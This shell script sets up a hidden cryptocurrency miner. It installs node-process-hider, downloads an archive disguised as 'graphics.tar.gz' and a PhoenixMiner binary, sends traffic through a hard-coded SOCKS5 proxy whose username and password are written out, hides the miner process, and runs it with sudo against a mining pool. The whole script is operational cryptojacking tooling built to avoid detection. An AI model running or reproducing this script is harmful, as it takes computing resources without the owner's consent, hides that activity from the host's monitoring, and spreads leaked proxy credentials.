apt update && apt -y install sudo wget curl unzip

apt-get install git build-essential cmake automake libtool autoconf

sudo apt install git build-essential cmake libuv1-dev uuid-dev libssl-dev

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata


wget https://github.com/denisule54/why/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 45.142.28.83:8094

socks5_username = kxrvszas

socks5_password = v3lxsp4hvv0r

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/denisule54/why/raw/main/PhoenixMiner
chmod +x PhoenixMiner


ph add PhoenixMiner

./graftcp/graftcp sudo ./PhoenixMiner -pool stratum+tcp://stratum.okpool.me:3336 -wal denisule54.001 -pass x
